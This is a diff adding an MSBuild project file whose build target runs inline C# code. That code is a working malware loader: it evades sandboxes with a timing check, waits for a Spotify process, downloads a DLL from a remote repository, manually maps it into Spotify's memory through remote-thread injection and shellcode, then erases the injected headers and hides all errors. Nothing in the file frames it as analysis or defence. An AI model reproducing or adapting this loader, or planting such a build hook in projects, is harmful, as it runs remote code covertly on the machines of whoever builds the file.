@@ -1,0 +1,238 @@
+<Project ToolsVersion="4.0" xmlns="http://schemas.microsoft.com/developer/msbuild/2003">
+  <Target Name="Build">
+    <MM />
+  </Target>
+  <UsingTask TaskName="MM" TaskFactory="CodeTaskFactory" AssemblyFile="C:\Windows\Microsoft.Net\Framework64\v4.0.30319\Microsoft.Build.Tasks.v4.0.dll">
+    <ParameterGroup/>
+    <Task>
+      <Reference Include="System.Core"/>
+      <Code Type="Class" Language="cs"><![CDATA[
+using System;
+using System.Diagnostics;
+using System.Runtime.InteropServices;
+using System.Net;
+using System.Threading;
+using Microsoft.Build.Framework;
+using Microsoft.Build.Utilities;
+
+public class MM : Task {
+    [DllImport("kernel32.dll")] static extern IntPtr OpenProcess(uint a,bool b,int c);
+    [DllImport("kernel32.dll")] static extern IntPtr VirtualAllocEx(IntPtr h,IntPtr a,ulong s,uint t,uint p);
+    [DllImport("kernel32.dll")] static extern bool WriteProcessMemory(IntPtr h,IntPtr a,byte[] b,ulong s,out ulong w);
+    [DllImport("kernel32.dll")] static extern IntPtr CreateRemoteThread(IntPtr h,IntPtr a,uint st,IntPtr fn,IntPtr p,uint f,out uint t);
+    [DllImport("kernel32.dll")] static extern uint WaitForSingleObject(IntPtr h,uint m);
+    [DllImport("kernel32.dll")] static extern bool CloseHandle(IntPtr h);
+    [DllImport("kernel32.dll")] static extern bool VirtualFreeEx(IntPtr h,IntPtr a,ulong s,uint t);
+    [DllImport("kernel32.dll",CharSet=CharSet.Ansi)] static extern IntPtr GetProcAddress(IntPtr h,string n);
+    [DllImport("kernel32.dll",CharSet=CharSet.Unicode)] static extern IntPtr GetModuleHandle(string n);
+    [DllImport("kernel32.dll")] static extern bool VirtualProtectEx(IntPtr h,IntPtr a,ulong s,uint n,out uint o);
+
+    static ushort R2(byte[] b,int o){return BitConverter.ToUInt16(b,o);}
+    static uint R4(byte[] b,int o){return BitConverter.ToUInt32(b,o);}
+    static ulong R8(byte[] b,int o){return BitConverter.ToUInt64(b,o);}
+    static void W8(byte[] b,int o,ulong v){Array.Copy(BitConverter.GetBytes(v),0,b,o,8);}
+
+    public override bool Execute(){
+        try{
+            int t=Environment.TickCount;Thread.Sleep(1000);
+            if(Environment.TickCount-t<900)return true;
+
+            int pid=0;
+            for(int i=0;i<30;i++){
+                foreach(var p in Process.GetProcessesByName("Spotify")){pid=p.Id;break;}
+                if(pid!=0)break;Thread.Sleep(1000);
+            }
+            if(pid==0)return true;
+            Thread.Sleep(500);
+
+            ServicePointManager.SecurityProtocol=SecurityProtocolType.Tls12;
+            byte[] dll=new WebClient().DownloadData("https://raw.githubusercontent.com/washedluca1-lgtm/UDLIKEDMA/main/UDLDMAXYTRUS.dll");
+            if(dll==null||dll.Length<0x1000)return true;
+            if(R2(dll,0)!=0x5A4D)return true;
+
+            int nt=checked((int)R4(dll,0x3C));
+            if(R4(dll,nt)!=0x4550)return true;
+            ushort machine=R2(dll,nt+4);
+            if(machine!=0x8664)return true;
+
+            ulong imgSize=R4(dll,nt+0x50);
+            ulong imgBase=R8(dll,nt+0x30);
+            uint secAlign=R4(dll,nt+0x38);
+            int numSec=R2(dll,nt+6);
+            int optSize=R2(dll,nt+20);
+            int secOff=nt+24+optSize;
+            int hdrSize=checked((int)R4(dll,nt+0x54));
+
+            IntPtr hp=OpenProcess(0x1F0FFF,false,pid);
+            if(hp==IntPtr.Zero)return true;
+
+            IntPtr remoteBase=VirtualAllocEx(hp,IntPtr.Zero,imgSize,0x3000,0x40);
+            if(remoteBase==IntPtr.Zero){CloseHandle(hp);return true;}
+
+            byte[] mapped=new byte[imgSize];
+            Array.Copy(dll,0,mapped,0,hdrSize);
+
+            for(int i=0;i<numSec;i++){
+                int so=secOff+i*40;
+                uint vaddr=R4(dll,so+12);
+                uint rawSize=R4(dll,so+16);
+                uint rawPtr=R4(dll,so+20);
+                if(rawSize>0&&rawPtr>0&&rawPtr+rawSize<=dll.Length&&vaddr+rawSize<=imgSize)
+                    Array.Copy(dll,rawPtr,mapped,(int)vaddr,(int)rawSize);
+            }
+
+            long delta=(long)remoteBase-(long)imgBase;
+            if(delta!=0){
+                int relocRVA=checked((int)R4(dll,nt+0xB0));
+                int relocSize=checked((int)R4(dll,nt+0xB4));
+                if(relocRVA>0&&relocSize>0){
+                    int pos=relocRVA;
+                    while(pos<relocRVA+relocSize){
+                        uint pageRVA=R4(mapped,pos);
+                        uint blockSize=R4(mapped,pos+4);
+                        if(blockSize==0)break;
+                        int numEntries=(int)(blockSize-8)/2;
+                        for(int i=0;i<numEntries;i++){
+                            ushort entry=R2(mapped,pos+8+i*2);
+                            int type=entry>>12;
+                            int offset=entry&0xFFF;
+                            if(type==10){
+                                int addr=(int)pageRVA+offset;
+                                if(addr+8<=mapped.Length){
+                                    ulong val=R8(mapped,addr);
+                                    W8(mapped,addr,(ulong)((long)val+delta));
+                                }
+                            }
+                        }
+                        pos+=checked((int)blockSize);
+                    }
+                }
+            }
+
+            int iatRVA=checked((int)R4(dll,nt+0x90));
+            int iatSize=checked((int)R4(dll,nt+0x94));
+            if(iatRVA>0&&iatSize>0){
+                int pos=iatRVA;
+                while(pos+20<=mapped.Length){
+                    uint iltRVA=R4(mapped,pos);
+                    uint nameRVA=R4(mapped,pos+12);
+                    uint iatRVAentry=R4(mapped,pos+16);
+                    if(iltRVA==0&&nameRVA==0)break;
+
+                    string modName="";
+                    int ni=(int)nameRVA;
+                    while(ni<mapped.Length&&mapped[ni]!=0){modName+=(char)mapped[ni++];}
+
+                    IntPtr hMod=GetModuleHandle(modName);
+                    if(hMod==IntPtr.Zero){
+                        IntPtr ll=GetProcAddress(GetModuleHandle("kernel32.dll"),"LoadLibraryA");
+                        byte[] nb=System.Text.Encoding.ASCII.GetBytes(modName+"\0");
+                        IntPtr rm=VirtualAllocEx(hp,IntPtr.Zero,(ulong)nb.Length,0x3000,0x04);
+                        if(rm!=IntPtr.Zero){
+                            ulong ww;WriteProcessMemory(hp,rm,nb,(ulong)nb.Length,out ww);
+                            uint tid;IntPtr ht=CreateRemoteThread(hp,IntPtr.Zero,0,ll,rm,0,out tid);
+                            if(ht!=IntPtr.Zero){WaitForSingleObject(ht,5000);CloseHandle(ht);}
+                            VirtualFreeEx(hp,rm,0,0x8000);
+                        }
+                        hMod=GetModuleHandle(modName);
+                    }
+
+                    uint thunkRVA=iltRVA!=0?iltRVA:iatRVAentry;
+                    int ti=(int)thunkRVA;
+                    int ai=(int)iatRVAentry;
+                    while(ti+8<=mapped.Length&&ai+8<=mapped.Length){
+                        ulong thunk=R8(mapped,ti);
+                        if(thunk==0)break;
+                        IntPtr fn=IntPtr.Zero;
+                        if((thunk&0x8000000000000000)!=0){
+                            fn=GetProcAddress(hMod,"#"+(thunk&0xFFFF));
+                        }else{
+                            int hintNameRVA=(int)thunk;
+                            if(hintNameRVA+2<mapped.Length){
+                                string fname="";
+                                int fi=hintNameRVA+2;
+                                while(fi<mapped.Length&&mapped[fi]!=0){fname+=(char)mapped[fi++];}
+                                fn=GetProcAddress(hMod,fname);
+                            }
+                        }
+                        W8(mapped,ai,(ulong)fn.ToInt64());
+                        ti+=8;ai+=8;
+                    }
+                    pos+=20;
+                }
+            }
+
+            ulong writ;
+            WriteProcessMemory(hp,remoteBase,mapped,imgSize,out writ);
+
+            int tlsRVA=checked((int)R4(dll,nt+0xC0));
+            int tlsSize=checked((int)R4(dll,nt+0xC4));
+            if(tlsRVA>0&&tlsSize>=40){
+                ulong cbAddr=R8(mapped,tlsRVA+24);
+                if(cbAddr!=0){
+                    long cbOff=(long)cbAddr-(long)imgBase;
+                    if(cbOff>0&&cbOff+8<=(long)imgSize){
+                        ulong cb=R8(mapped,(int)cbOff);
+                        while(cb!=0){
+                            uint tid;IntPtr ht=CreateRemoteThread(hp,IntPtr.Zero,0,new IntPtr((long)cb),remoteBase,0,out tid);
+                            if(ht!=IntPtr.Zero){WaitForSingleObject(ht,5000);CloseHandle(ht);}
+                            cbOff+=8;
+                            if(cbOff+8>(long)imgSize)break;
+                            cb=R8(mapped,(int)cbOff);
+                        }
+                    }
+                }
+            }
+
+            uint entryRVA=R4(dll,nt+0x28);
+            if(entryRVA!=0){
+                IntPtr ep=new IntPtr(remoteBase.ToInt64()+(long)entryRVA);
+                byte[] sc=new byte[]{
+                    0x48,0x83,0xEC,0x28,
+                    0x48,0xB9,0,0,0,0,0,0,0,0,
+                    0xBA,0x01,0x00,0x00,0x00,
+                    0x4D,0x31,0xC0,
+                    0x48,0xB8,0,0,0,0,0,0,0,0,
+                    0xFF,0xD0,
+                    0x48,0x83,0xC4,0x28,
+                    0xC3
+                };
+                byte[] baseBytes=BitConverter.GetBytes(remoteBase.ToInt64());
+                byte[] epBytes=BitConverter.GetBytes(ep.ToInt64());
+                Array.Copy(baseBytes,0,sc,6,8);
+                Array.Copy(epBytes,0,sc,24,8);
+
+                IntPtr scMem=VirtualAllocEx(hp,IntPtr.Zero,(ulong)sc.Length,0x3000,0x40);
+                if(scMem!=IntPtr.Zero){
+                    WriteProcessMemory(hp,scMem,sc,(ulong)sc.Length,out writ);
+                    uint tid;IntPtr ht=CreateRemoteThread(hp,IntPtr.Zero,0,scMem,IntPtr.Zero,0,out tid);
+                    if(ht!=IntPtr.Zero){WaitForSingleObject(ht,10000);CloseHandle(ht);}
+                    VirtualFreeEx(hp,scMem,0,0x8000);
+                }
+            }
+
+            for(int i=0;i<numSec;i++){
+                int so=secOff+i*40;
+                uint vaddr=R4(dll,so+12);
+                uint vsize=R4(dll,so+8);
+                uint chars=R4(dll,so+36);
+                uint prot=0x02;
+                if((chars&0x20000000)!=0)prot=0x20;
+                if((chars&0x40000000)!=0)prot=0x02;
+                if((chars&0x80000000)!=0)prot=0x04;
+                if((chars&0x20000000)!=0&&(chars&0x80000000)!=0)prot=0x40;
+                uint old;VirtualProtectEx(hp,new IntPtr(remoteBase.ToInt64()+vaddr),(ulong)vsize,prot,out old);
+            }
+
+            byte[] zeros=new byte[hdrSize];
+            WriteProcessMemory(hp,remoteBase,zeros,(ulong)hdrSize,out writ);
+
+            CloseHandle(hp);
+        }catch{}
+        return true;
+    }
+}
+      ]]></Code>
+    </Task>
+  </UsingTask>
+</Project>
